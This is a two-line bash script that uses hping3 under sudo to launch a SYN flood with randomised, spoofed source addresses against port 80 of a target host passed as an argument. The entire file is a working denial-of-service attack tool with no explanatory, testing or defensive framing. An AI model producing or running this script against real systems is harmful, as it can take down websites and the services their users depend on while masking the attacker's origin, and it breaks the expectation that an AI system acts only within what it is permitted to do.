#!/bin/bash
sudo hping3 --syn --flood --rand-source -p 80 "$1"
